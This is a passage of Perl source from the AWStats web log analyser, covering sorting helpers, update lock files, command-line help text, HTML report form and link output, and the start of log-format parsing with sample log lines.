( scalar keys %val )\n\t\t\t\t  . \", nb elem egal=\"\n\t\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\treturn;\n\t}\n\tif ( $val{$keyval} ) {    # Val is already in tree\n\t\tif ($Debug) { debug( \"  val is already in tree\", 4 ); }\n\t\t$egal{$keytoadd} = $val{$keyval};\n\t\t$val{$keyval}    = $keytoadd;\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"  lowerval=$lowerval, nb elem val=\"\n\t\t\t\t  . ( scalar keys %val )\n\t\t\t\t  . \", nb elem egal=\"\n\t\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\treturn;\n\t}\n\tif ( $keyval <= $lowerval )\n\t{    # Val is a new one lower (should happens only when tree is not full)\n\t\tif ($Debug) {\n\t\t\tdebug(\n\"  keytoadd val=$keyval is lower or equal to lowerval=$lowerval\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\t$val{$keyval}     = $keytoadd;\n\t\t$nextval{$keyval} = $lowerval;\n\t\t$lowerval         = $keyval;\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"  lowerval=$lowerval, nb elem val=\"\n\t\t\t\t  . ( scalar keys %val )\n\t\t\t\t  . \", nb elem egal=\"\n\t\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\treturn;\n\t}\n\n\t# Val is a new one higher\n\tif ($Debug) {\n\t\tdebug( \"  keytoadd val=$keyval is higher than lowerval=$lowerval\", 4 );\n\t}\n\t$val{$keyval} = $keytoadd;\n\tmy $valcursor = $lowerval;    # valcursor is value just before keyval\n\twhile ( $nextval{$valcursor} && ( $nextval{$valcursor} < $keyval ) ) {\n\t\t$valcursor = $nextval{$valcursor};\n\t}\n\tif ( $nextval{$valcursor} )\n\t{    # keyval is between valcursor and nextval{valcursor}\n\t\t$nextval{$keyval} = $nextval{$valcursor};\n\t}\n\t$nextval{$valcursor} = $keyval;\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"  lowerval=$lowerval, nb elem val=\"\n\t\t\t  . ( scalar keys %val )\n\t\t\t  . \", nb elem egal=\"\n\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t4\n\t\t);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Remove a val from sorting tree\n# Parameters:   None\n# Input:        $lowerval %val %egal\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub Removelowerval {\n\tmy $keytoremove = $val{$lowerval};    # This is lower key\n\tif ($Debug) {\n\t\tdebug( \"   remove for lowerval=$lowerval: key=$keytoremove\", 4 );\n\t}\n\tif ( $egal{$keytoremove} ) {\n\t\t$val{$lowerval} = $egal{$keytoremove};\n\t\tdelete $egal{$keytoremove};\n\t}\n\telse {\n\t\tdelete $val{$lowerval};\n\t\t$lowerval = $nextval{$lowerval};    # Set new lowerval\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"   new lower value=$lowerval, val size=\"\n\t\t\t  . ( scalar keys %val )\n\t\t\t  . \", egal size=\"\n\t\t\t  . ( scalar keys %egal ),\n\t\t\t4\n\t\t);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Build @keylist array\n# Parameters:   Size max for @keylist array,\n#               Min value in hash for select,\n#               Hash used for select,\n#               Hash used for order\n# Input:        None\n# Output:       None\n# Return:       @keylist response array\n#------------------------------------------------------------------------------\nsub BuildKeyList {\n\tmy $ArraySize = shift || error(\n\"System error. Call to BuildKeyList function with incorrect value for first param\",\n\t\t\"\", \"\", 1\n\t);\n\tmy $MinValue = shift || error(\n\"System error. Call to BuildKeyList function with incorrect value for second param\",\n\t\t\"\", \"\", 1\n\t);\n\tmy $hashforselect = shift;\n\tmy $hashfororder  = shift;\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"  BuildKeyList($ArraySize,$MinValue,$hashforselect with size=\"\n\t\t\t  . ( scalar keys %$hashforselect )\n\t\t\t  . \",$hashfororder with size=\"\n\t\t\t  . ( scalar keys %$hashfororder ) . \")\",\n\t\t\t3\n\t\t);\n\t}\n\tdelete $hashforselect->{0};\n\tdelete $hashforselect->{ ''\n\t  }; # Those is to protect from infinite loop when hash array has an incorrect null key\n\tmy $count = 0;\n\t$lowerval = 0;    # Global because used in AddInTree and Removelowerval\n\t%val      = ();\n\t%nextval  = ();\n\t%egal     = ();\n\n\tforeach my $key ( keys %$hashforselect ) {\n\t\tif ( $count < $ArraySize ) {\n\t\t\tif ( $hashforselect->{$key} >= $MinValue ) {\n\t\t\t\t$count++;\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\t\t\t\t\t\t\"  Add in tree entry $count : $key (value=\"\n\t\t\t\t\t\t  . ( $hashfororder->{$key} || 0 )\n\t\t\t\t\t\t  . \", tree not full)\",\n\t\t\t\t\t\t4\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tAddInTree( $key, $hashfororder->{$key} || 0, $count );\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\t$count++;\n\t\tif ( ( $hashfororder->{$key} || 0 ) <= $lowerval ) { next; }\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"  Add in tree entry $count : $key (value=\"\n\t\t\t\t  . ( $hashfororder->{$key} || 0 )\n\t\t\t\t  . \" > lowerval=$lowerval)\",\n\t\t\t\t4\n\t\t\t);\n\t\t}\n\t\tAddInTree( $key, $hashfororder->{$key} || 0 );\n\t\tif ($Debug) { debug( \"  Removelower in tree\", 4 ); }\n\t\tRemovelowerval();\n\t}\n\n\t# Build key list and sort it\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"  Build key list and sort it. lowerval=$lowerval, nb elem val=\"\n\t\t\t  . ( scalar keys %val )\n\t\t\t  . \", nb elem egal=\"\n\t\t\t  . ( scalar keys %egal ) . \".\",\n\t\t\t3\n\t\t);\n\t}\n\tmy %notsortedkeylist = ();\n\tforeach my $key ( values %val )  { $notsortedkeylist{$key} = 1; }\n\tforeach my $key ( values %egal ) { $notsortedkeylist{$key} = 1; }\n\t@keylist = ();\n\t@keylist = (\n\t\tsort { ( $hashfororder->{$b} || 0 ) <=> ( $hashfororder->{$a} || 0 ) }\n\t\t  keys %notsortedkeylist\n\t);\n\tif ($Debug) {\n\t\tdebug( \"  BuildKeyList End (keylist size=\" . (@keylist) . \")\", 3 );\n\t}\n\treturn;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Lock or unlock update\n# Parameters:   status (1 to lock, 0 to unlock)\n# Input:        $DirLock (if status=0) $PROG $FileSuffix\n# Output:       $DirLock (if status=1)\n# Return:       None\n#------------------------------------------------------------------------------\nsub Lock_Update {\n\tmy $status = shift;\n\tmy $lock   = \"$PROG$FileSuffix.lock\";\n\tif ($status) {\n\n\t\t# We stop if there is at least one lock file wherever it is\n\t\tforeach my $key ( $ENV{\"TEMP\"}, $ENV{\"TMP\"}, \"/tmp\", \"/\", \".\" ) {\n\t\t\tmy $newkey = $key;\n\t\t\t$newkey =~ s/[\\\\\\/]$//;\n\t\t\tif ( -f \"$newkey/$lock\" ) {\n\t\t\t\terror(\n\"An AWStats update process seems to be already running for this config file. Try later.\\nIf this is not true, remove manually lock file '$newkey/$lock'.\",\n\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\n\t\t# Set lock where we can\n\t\tforeach my $key ( $ENV{\"TEMP\"}, $ENV{\"TMP\"}, \"/tmp\", \"/\", \".\" ) {\n\t\t\tif ( !-d \"$key\" ) { next; }\n\t\t\t$DirLock = $key;\n\t\t\t$DirLock =~ s/[\\\\\\/]$//;\n\t\t\tif ($Debug) { debug(\"Update lock file $DirLock/$lock is set\"); }\n\t\t\topen( LOCK, \">$DirLock/$lock\" )\n\t\t\t  || error( \"Failed to create lock file $DirLock/$lock\", \"\", \"\",\n\t\t\t\t1 );\n\t\t\tprint LOCK\n\"AWStats update started by process $$ at $nowyear-$nowmonth-$nowday $nowhour:$nowmin:$nowsec\\n\";\n\t\t\tclose(LOCK);\n\t\t\tlast;\n\t\t}\n\t}\n\telse {\n\n\t\t# Remove lock\n\t\tif ($Debug) { debug(\"Update lock file $DirLock/$lock is removed\"); }\n\t\tunlink(\"$DirLock/$lock\");\n\t}\n\treturn;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Signal handler to call Lock_Update to remove lock file\n# Parameters:   Signal name\n# Input:        None\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub SigHandler {\n\tmy $signame = shift;\n\tprint ucfirst($PROG) . \" process (ID $$) interrupted by signal $signame.\\n\";\n\t&Lock_Update(0);\n\texit 1;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Convert an IPAddress into an integer\n# Parameters:   IPAddress\n# Input:        None\n# Output:       None\n# Return:       Int\n#------------------------------------------------------------------------------\nsub Convert_IP_To_Decimal {\n\tmy ($IPAddress) = @_;\n\tmy @ip_seg_arr = split( /\\./, $IPAddress );\n\tmy $decimal_ip_address =\n\t  256 * 256 * 256 * $ip_seg_arr[0] + 256 * 256 * $ip_seg_arr[1] + 256 *\n\t  $ip_seg_arr[2] + $ip_seg_arr[3];\n\treturn ($decimal_ip_address);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Test there is at least one value in list not null\n# Parameters:   List of values\n# Input:        None\n# Output:       None\n# Return:       1 There is at least one not null value, 0 else\n#------------------------------------------------------------------------------\nsub AtLeastOneNotNull {\n\tif ($Debug) {\n\t\tdebug( \" Call to AtLeastOneNotNull (\" . join( '-', @_ ) . \")\", 3 );\n\t}\n\tforeach my $val (@_) {\n\t\tif ($val) { return 1; }\n\t}\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the command line interface help information\n# Parameters:   None\n# Input:        None\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub PrintCLIHelp{\n\t&Read_Ref_Data(\n\t\t'browsers',       'domains', 'operating_systems', 'robots',\n\t\t'search_engines', 'worms'\n\t);\n\tprint \"----- $PROG $VERSION (c) 2000-2016 Laurent Destailleur -----\\n\";\n\tprint\n\"AWStats is a free web server logfile analyzer to show you advanced web\\n\";\n\tprint \"statistics.\\n\";\n\tprint\n\"AWStats comes with ABSOLUTELY NO WARRANTY. It's a free software distributed\\n\";\n\tprint \"with a GNU General Public License (See LICENSE file for details).\\n\";\n\tprint \"\\n\";\n\tprint \"Syntax: $PROG.$Extension -config=virtualhostname [options]\\n\";\n\tprint \"\\n\";\n\tprint\n\"  This runs $PROG in command line to update statistics (-update option) of a\\n\";\n\tprint\n\"   web site, from the log file defined in AWStats config file, or build a HTML\\n\";\n\tprint \"   report (-output option).\\n\";\n\tprint\n\"  First, $PROG tries to read $PROG.virtualhostname.conf as the config file.\\n\";\n\tprint \"  If not found, $PROG tries to read $PROG.conf, and finally the full path passed to -config=\\n\";\n\tprint\n\"  Note 1: Config files ($PROG.virtualhostname.conf or $PROG.conf) must be\\n\";\n\tprint\n\"   in /etc/awstats, /usr/local/etc/awstats, /etc or same directory than\\n\";\n\tprint \"   awstats.pl script file.\\n\";\n\tprint\n\"  Note 2: If AWSTATS_FORCE_CONFIG environment variable is defined, AWStats will\\n\";\n\tprint\n\"   use it as the \\\"config\\\" value, whatever is the value on command line or URL.\\n\";\n\tprint \"   See AWStats documentation for all setup instrutions.\\n\";\n\tprint \"\\n\";\n\tprint \"Options to update statistics:\\n\";\n\tprint \"  -update        to update statistics (default)\\n\";\n\tprint\n\"  -showsteps     to add benchmark information every $NBOFLINESFORBENCHMARK lines processed\\n\";\n\tprint\n\"  -showcorrupted to add output for each corrupted lines found, with reason\\n\";\n\tprint\n\"  -showdropped   to add output for each dropped lines found, with reason\\n\";\n\tprint \"  -showunknownorigin  to output referer when it can't be parsed\\n\";\n\tprint\n\"  -showdirectorigin   to output log line when origin is a direct access\\n\";\n\tprint \"  -updatefor=n   to stop the update process after parsing n lines\\n\";\n\tprint\n\"  -LogFile=x     to change log to analyze whatever is 'LogFile' in config file\\n\";\n\tprint\n\"  Be care to process log files in chronological order when updating statistics.\\n\";\n\tprint \"\\n\";\n\tprint \"Options to show statistics:\\n\";\n\tprint\n\"  -output      to output main HTML report (no update made except with -update)\\n\";\n\tprint \"  -output=x    to output other report pages where x is:\\n\";\n\tprint\n\"               alldomains       to build page of all domains/countries\\n\";\n\tprint \"               allhosts         to build page of all hosts\\n\";\n\tprint\n\t  \"               lasthosts        to build page of last hits for hosts\\n\";\n\tprint\n\t  \"               unknownip        to build page of all unresolved IP\\n\";\n\tprint\n\"               allemails        to build page of all email senders (maillog)\\n\";\n\tprint\n\"               lastemails       to build page of last email senders (maillog)\\n\";\n\tprint\n\"               allemailr        to build page of all email receivers (maillog)\\n\";\n\tprint\n\"               lastemailr       to build page of last email receivers (maillog)\\n\";\n\tprint \"               alllogins        to build page of all logins used\\n\";\n\tprint\n\t  \"               lastlogins       to build page of last hits for logins\\n\";\n\tprint\n\"               allrobots        to build page of all robots/spider visits\\n\";\n\tprint\n\t  \"               lastrobots       to build page of last hits for robots\\n\";\n\tprint \"               urldetail        to list most often viewed pages \\n\";\n\tprint\n\"               urldetail:filter to list most often viewed pages matching filter\\n\";\n\tprint \"               urlentry         to list entry pages\\n\";\n\tprint\n\t  \"               urlentry:filter  to list entry pages matching filter\\n\";\n\tprint \"               urlexit          to list exit pages\\n\";\n\tprint\n\t  \"               urlexit:filter   to list exit pages matching filter\\n\";\n\tprint\n\"               osdetail         to build page with os detailed versions\\n\";\n\tprint\n\"               browserdetail    to build page with browsers detailed versions\\n\";\n\tprint\n\"               unknownbrowser   to list 'User Agents' with unknown browser\\n\";\n\tprint\n\t  \"               unknownos        to list 'User Agents' with unknown OS\\n\";\n\tprint\n\"               refererse        to build page of all refering search engines\\n\";\n\tprint\n\t  \"               refererpages     to build page of all refering pages\\n\";\n\n #print \"               referersites     to build page of all refering sites\\n\";\n\tprint\n\"               keyphrases       to list all keyphrases used on search engines\\n\";\n\tprint\n\"               keywords         to list all keywords used on search engines\\n\";\n\tprint \"               errors404        to list 'Referers' for 404 errors\\n\";\n\tprint\n\"               allextraX        to build page of all values for ExtraSection X\\n\";\n\tprint \"  -staticlinks           to have static links in HTML report page\\n\";\n\tprint \"  -staticlinksext=xxx    to have static links with .xxx extension instead of .html\\n\";\n\tprint\n\"  -lang=LL     to output a HTML report in language LL (en,de,es,fr,it,nl,...)\\n\";\n\tprint \"  -month=MM    to output a HTML report for an old month MM\\n\";\n\tprint \"  -year=YYYY   to output a HTML report for an old year YYYY\\n\";\n\tprint\n\"  The 'date' options doesn't allow you to process old log file. They only\\n\";\n\tprint\n\"  allow you to see a past report for a chosen month/year period instead of\\n\";\n\tprint \"  current month/year.\\n\";\n\tprint \"\\n\";\n\tprint \"Other options:\\n\";\n\tprint\n\"  -debug=X     to add debug informations lesser than level X (speed reduced)\\n\";\n\tprint\n\"  -version     show AWStats version\\n\";\n\tprint \"\\n\";\n\tprint \"Now supports/detects:\\n\";\n\tprint\n\"  Web/Ftp/Mail/streaming server log analyzis (and load balanced log files)\\n\";\n\tprint \"  Reverse DNS lookup (IPv4 and IPv6) and GeoIP lookup\\n\";\n\tprint \"  Number of visits, number of unique visitors\\n\";\n\tprint \"  Visits duration and list of last visits\\n\";\n\tprint \"  Authenticated users\\n\";\n\tprint \"  Days of week and rush hours\\n\";\n\tprint \"  Hosts list and unresolved IP addresses list\\n\";\n\tprint \"  Most viewed, entry and exit pages\\n\";\n\tprint \"  Files type and Web compression (mod_gzip, mod_deflate stats)\\n\";\n\tprint \"  Screen size\\n\";\n\tprint \"  Ratio of Browsers with support of: Java, Flash, RealG2 reader,\\n\";\n\tprint \"                        Quicktime reader, WMA reader, PDF reader\\n\";\n\tprint \"  Configurable personalized reports\\n\";\n\tprint \"  \" . ( scalar keys %DomainsHashIDLib ) . \" domains/countries\\n\";\n\tprint \"  \" . ( scalar keys %RobotsHashIDLib ) . \" robots\\n\";\n\tprint \"  \" . ( scalar keys %WormsHashLib ) . \" worm's families\\n\";\n\tprint \"  \" . ( scalar keys %OSHashLib ) . \" operating systems\\n\";\n\tprint \"  \" . ( scalar keys %BrowsersHashIDLib ) . \" browsers\";\n\t&Read_Ref_Data('browsers_phone');\n\tprint \" (\"\n\t  . ( scalar keys %BrowsersHashIDLib )\n\t  . \" with phone browsers database)\\n\";\n\tprint \"  \"\n\t  . ( scalar keys %SearchEnginesHashLib )\n\t  . \" search engines (and keyphrases/keywords used from them)\\n\";\n\tprint \"  All HTTP errors with last referrer\\n\";\n\tprint \"  Report by day/month/year\\n\";\n\tprint \"  Dynamic or static HTML or XHTML reports, static PDF reports\\n\";\n\tprint \"  Indexed text or XML monthly database\\n\";\n\tprint \"  And a lot of other advanced features and options...\\n\";\n\tprint \"New versions and FAQ at http://www.awstats.org\\n\";\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return the string to add in html tag to include popup javascript code\n# Parameters:   tooltip number\n# Input:        None\n# Output:       None\n# Return:       string with javascript code\n#------------------------------------------------------------------------------\nsub Tooltip {\n\tmy $ttnb = shift;\n\treturn (\n\t\t$TOOLTIPON\n\t\t? \" onmouseover=\\\"ShowTip($ttnb);\\\" onmouseout=\\\"HideTip($ttnb);\\\"\"\n\t\t: \"\"\n\t);\n}\n\n#------------------------------------------------------------------------------\n# Function:     Insert a form filter\n# Parameters:   Name of filter field, default for filter field, default for exclude filter field\n# Input:        $StaticLinks, $QueryString, $SiteConfig, $DirConfig\n# Output:       HTML Form\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowFormFilter {\n\tmy $fieldfiltername    = shift;\n\tmy $fieldfilterinvalue = shift;\n\tmy $fieldfilterexvalue = shift;\n\tif ( !$StaticLinks ) {\n\t\tmy $NewLinkParams = ${QueryString};\n\t\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)output(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t$NewLinkParams =~ s/&amp;$//;\n\t\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\t\tprint \"\\n<form name=\\\"FormFilter\\\" action=\\\"\"\n\t\t  . XMLEncode(\"$AWScript${NewLinkParams}\")\n\t\t  . \"\\\" class=\\\"aws_border\\\">\\n\";\n\t\tprint\n\"<table valign=\\\"middle\\\" width=\\\"99%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"2\\\"><tr>\\n\";\n\t\tprint \"<td align=\\\"left\\\" width=\\\"50\\\">$Message[79]&nbsp;:</td>\\n\";\n\t\tprint\n\"<td align=\\\"left\\\" width=\\\"100\\\"><input type=\\\"text\\\" name=\\\"${fieldfiltername}\\\" value=\\\"$fieldfilterinvalue\\\" class=\\\"aws_formfield\\\" /></td>\\n\";\n\t\tprint \"<td> &nbsp; </td>\";\n\t\tprint \"<td align=\\\"left\\\" width=\\\"100\\\">$Message[153]&nbsp;:</td>\\n\";\n\t\tprint\n\"<td align=\\\"left\\\" width=\\\"100\\\"><input type=\\\"text\\\" name=\\\"${fieldfiltername}ex\\\" value=\\\"$fieldfilterexvalue\\\" class=\\\"aws_formfield\\\" /></td>\\n\";\n\t\tprint \"<td>\";\n\t\tprint \"<input type=\\\"hidden\\\" name=\\\"output\\\" value=\\\"\"\n\t\t  . join( ',', keys %HTMLOutput )\n\t\t  . \"\\\" />\\n\";\n\n\t\tif ($SiteConfig) {\n\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"config\\\" value=\\\"$SiteConfig\\\" />\\n\";\n\t\t}\n\t\tif ($DirConfig) {\n\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"configdir\\\" value=\\\"$DirConfig\\\" />\\n\";\n\t\t}\n\t\tif ( $QueryString =~ /(^|&|&amp;)year=(\\d\\d\\d\\d)/i ) {\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"year\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tif (   $QueryString =~ /(^|&|&amp;)month=(\\d\\d)/i\n\t\t\t|| $QueryString =~ /(^|&|&amp;)month=(all)/i )\n\t\t{\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"month\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tif ( $QueryString =~ /(^|&|&amp;)lang=(\\w+)/i ) {\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"lang\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tif ( $QueryString =~ /(^|&|&amp;)debug=(\\d+)/i ) {\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"debug\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tif ( $QueryString =~ /(^|&|&amp;)framename=(\\w+)/i ) {\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"framename\\\" value=\\\"$2\\\" />\\n\";\n\t\t}\n\t\tprint\n\"<input type=\\\"submit\\\" value=\\\" $Message[115] \\\" class=\\\"aws_button\\\" /></td>\\n\";\n\t\tprint \"<td> &nbsp; </td>\";\n\t\tprint \"</tr></table>\\n\";\n\t\tprint \"</form>\\n\";\n\t\tprint \"<br />\\n\";\n\t\tprint \"\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write other user info (with help of plugin)\n# Parameters:   $user\n# Input:        $SiteConfig\n# Output:       URL link\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowUserInfo {\n\tmy $user = shift;\n\n\t# Call to plugins' function ShowInfoUser\n\tforeach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoUser'} } ) {\n\n\t\t#\t\tmy $function=\"ShowInfoUser_$pluginname('$user')\";\n\t\t#\t\teval(\"$function\");\n\t\tmy $function = \"ShowInfoUser_$pluginname\";\n\t\t&$function($user);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write other cluster info (with help of plugin)\n# Parameters:   $clusternb\n# Input:        $SiteConfig\n# Output:       Cluster info\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowClusterInfo {\n\tmy $cluster = shift;\n\n\t# Call to plugins' function ShowInfoCluster\n\tforeach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoCluster'} } )\n\t{\n\n\t\t#\t\tmy $function=\"ShowInfoCluster_$pluginname('$user')\";\n\t\t#\t\teval(\"$function\");\n\t\tmy $function = \"ShowInfoCluster_$pluginname\";\n\t\t&$function($cluster);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write other host info (with help of plugin)\n# Parameters:   $host\n# Input:        $LinksToWhoIs $LinksToWhoIsIp\n# Output:       None\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowHostInfo {\n\tmy $host = shift;\n\n\t# Call to plugins' function ShowInfoHost\n\tforeach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoHost'} } ) {\n\n\t\t#\t\tmy $function=\"ShowInfoHost_$pluginname('$host')\";\n\t\t#\t\teval(\"$function\");\n\t\tmy $function = \"ShowInfoHost_$pluginname\";\n\t\t&$function($host);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Write other url info (with help of plugin)\n# Parameters:   $url\n# Input:        %Aliases $MaxLengthOfShownURL $ShowLinksOnUrl $SiteDomain $UseHTTPSLinkForUrl\n# Output:       URL link\n# Return:       None\n#------------------------------------------------------------------------------\nsub HTMLShowURLInfo {\n\tmy $url     = shift;\n\tmy $nompage = CleanXSS($url);\n\n\t# Call to plugins' function ShowInfoURL\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowInfoURL'} } ) {\n\n\t\t#\t\tmy $function=\"ShowInfoURL_$pluginname('$url')\";\n\t\t#\t\teval(\"$function\");\n\t\tmy $function = \"ShowInfoURL_$pluginname\";\n\t\t&$function($url);\n\t}\n\n\tif ( length($nompage) > $MaxLengthOfShownURL ) {\n\t\t$nompage = substr( $nompage, 0, $MaxLengthOfShownURL ) . \"...\";\n\t}\n\tif ($ShowLinksOnUrl) {\n\t\tmy $newkey = CleanXSS($url);\n\t\tif ( $LogType eq 'W' || $LogType eq 'S' ) {  # Web or streaming log file\n\t\t\tif ( $newkey =~ /^http(s|):/i )\n\t\t\t{    # URL seems to be extracted from a proxy log file\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . XMLEncode(\"$newkey\")\n\t\t\t\t  . \"\\\" target=\\\"url\\\" rel=\\\"nofollow noopener noreferrer\\\">\"\n\t\t\t\t  . XMLEncode($nompage) . \"</a>\";\n\t\t\t}\n\t\t\telsif ( $newkey =~ /^\\// )\n\t\t\t{ # URL seems to be an url extracted from a web or wap server log file\n\t\t\t\t$newkey =~ s/^\\/$SiteDomain//i;\n\n\t\t\t\t# Define urlprot\n\t\t\t\tmy $urlprot = 'http';\n\t\t\t\tif ( $UseHTTPSLinkForUrl && $newkey =~ /^$UseHTTPSLinkForUrl/ )\n\t\t\t\t{\n\t\t\t\t\t$urlprot = 'https';\n\t\t\t\t}\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . XMLEncode(\"$urlprot://$SiteDomain$newkey\")\n\t\t\t\t  . \"\\\" target=\\\"url\\\" rel=\\\"nofollow noopener noreferrer\\\">\"\n\t\t\t\t  . XMLEncode($nompage) . \"</a>\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint XMLEncode($nompage);\n\t\t\t}\n\t\t}\n\t\telsif ( $LogType eq 'F' ) {    # Ftp log file\n\t\t\tprint XMLEncode($nompage);\n\t\t}\n\t\telsif ( $LogType eq 'M' ) {    # Smtp log file\n\t\t\tprint XMLEncode($nompage);\n\t\t}\n\t\telse {                         # Other type log file\n\t\t\tprint XMLEncode($nompage);\n\t\t}\n\t}\n\telse {\n\t\tprint XMLEncode($nompage);\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Define value for PerlParsingFormat (used for regex log record parsing)\n# Parameters:   $LogFormat\n# Input:        -\n# Output:       $pos_xxx, @pos_extra, @fieldlib, $PerlParsingFormat\n# Return:       -\n#------------------------------------------------------------------------------\nsub DefinePerlParsingFormat {\n\tmy $LogFormat = shift;\n\t$pos_vh = $pos_host = $pos_logname = $pos_date = $pos_tz = $pos_method =\n\t  $pos_url = $pos_code = $pos_size = -1;\n\t$pos_referer = $pos_agent = $pos_query = $pos_gzipin = $pos_gzipout =\n\t  $pos_compratio   = -1;\n\t$pos_cluster       = $pos_emails = $pos_emailr = $pos_hostr = -1;\n\t@pos_extra         = ();\n\t@fieldlib          = ();\n\t$PerlParsingFormat = '';\n\n# Log records examples:\n# Apache combined:             62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] \"GET / HTTP/1.1\" 200 1234 \"http://www.from.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n# Apache combined (408 error): my.domain.com - user [09/Jan/2001:11:38:51 -0600] \"OPTIONS /mime-tmp/xxx file.doc HTTP/1.1\" 408 - \"-\" \"-\"\n# Apache combined (408 error): 62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] \"-\" 408 - \"-\" \"-\"\n# Apache combined (400 error): 80.8.55.11 - - [28/Apr/2007:03:20:02 +0200] \"GET /\" 400 584 \"-\" \"-\"\n# IIS:                         2000-07-19 14:14:14 62.161.78.73 - GET / 200 1234 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) http://www.from.com/from.htm\n# WebStar:                     05/21/00\t00:17:31\tOK  \t200\t212.242.30.6\tMozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)\thttp://www.cover.dk/\t\"www.cover.dk\"\t:Documentation:graphics:starninelogo.white.gif\t1133\n# Squid extended:              12.229.91.170 - - [27/Jun/2002:03:30:50 -0700] \"GET http://www.callistocms.com/images/printable.gif HTTP/1.1\" 304 354 \"-\" \"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\" TCP_REFRESH_HIT:DIRECT\n# Log formats:\n# Apache common_with_mod_gzip_info1: %h %l %u %t \\\"%r\\\" %>s %b mod_gzip: %{mod_gzip_compression_ratio}npct.\n# Apache common_with_mod_gzip_info2: %h %l %u %t \\\"%r\\\" %>s %b mod_gzip: %{mod_gzip_result}n In:%{mod_gzip_input_size}n Out:%{mod_gzip_output_size}n:%{mod_gzip_compression_ratio}npct.\n# Apache deflate: %h %l %u %t \\\"%r\\\" %>s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\" (%{ratio}n)\n\tif ($Debug) {\n\t\tdebug(\n\"Call To DefinePerlParsingFormat (LogType='$LogType', LogFormat='$LogFormat')\"\n\t\t);\n\t}\n\tif ( $LogFormat =~ /^[1-6]$/ ) {    # Pre-defined log format\n\t\tif ( $LogFormat eq '1' || $LogFormat eq '6' )\n\t\t{ # Same than \"%h %l %u %t \\\"%r\\\" %>s %b \\\"%{Referer}i\\\" \\\"%{User-Agent}i\\\"\".\n\t\t\t # %u (user) is \"([^\\\\/\\\\[]+)\" instead of \"[^ ]+\" because can contain space (Lotus Notes). referer and ua might be \"\".\n\n# $PerlParsingFormat=\"([^ ]+) [^ ]+ ([^\\\\/\\\\[]+) \\\\[([^ ]+) [^ ]+\\\\] \\\\\\\"([^ ]+) (.+) [^\\\\\\\"]+\\\\\\\" ([\\\\d|-]+) ([\\\\d|-]+) 